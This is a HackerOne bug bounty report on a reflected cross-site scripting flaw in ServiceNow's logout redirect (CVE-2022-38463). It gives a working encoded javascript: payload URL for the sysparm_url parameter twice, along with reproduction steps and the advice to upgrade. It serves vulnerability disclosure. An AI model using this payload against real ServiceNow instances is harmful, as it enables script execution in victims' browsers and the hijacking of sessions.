# XSS in ServiceNow logout https://████:443

## Metadata
- **Source:** HackerOne
- **Report:** 1699855 | https://hackerone.com/reports/1699855
- **Submitted:** 2022-09-14
- **Reporter:** colemanj
- **Program:** Unknown
- **Bounty:** Not disclosed
- **Severity:** medium
- **Vuln:** Cross-site Scripting (XSS) - Reflected
- **CVEs:** CVE-2022-38463
- **Category:** web-api

## Summary
**Description:**
XSS in ServiceNow logout 
https://██████:443/logout_redirect.do?sysparm_url=//j%5c%5cjavascript%3aalert(document.domain)
## References
https://nvd.nist.gov/vuln/detail/CVE-2022-38463

## Impact

Unauthenticated remote attacker can execute code in user's browser context.  User must click on malicious link

## System Host(s)
███████

## Affected Product(s) and Version(s)
Servicenow 

## Attack scenario
*(see original)*

## Root cause
*(see original)*

## Attacker mindset
*(see original)*

## Defensive takeaways
*(see original)*

## Variant hunting
*(see original)*

## MITRE ATT&CK
*(see original)*

## Notes
*(see original)*

## Full report
<details><summary>Expand</summary>

**Description:**
XSS in ServiceNow logout 
https://██████:443/logout_redirect.do?sysparm_url=//j%5c%5cjavascript%3aalert(document.domain)
## References
https://nvd.nist.gov/vuln/detail/CVE-2022-38463

## Impact

Unauthenticated remote attacker can execute code in user's browser context.  User must click on malicious link

## System Host(s)
███████

## Affected Product(s) and Version(s)
Servicenow prior to SanDiego SP6

## CVE Numbers
CVE-2022-38463

## Steps to Reproduce
Click on https://█████:443/logout_redirect.do?sysparm_url=//j%5c%5cjavascript%3aalert(document.domain)

## Suggested Mitigation/Remediation Actions
Upgrade to patched version of ServiceNow



</details>

---
*Analysed by Claude on 2026-05-24*
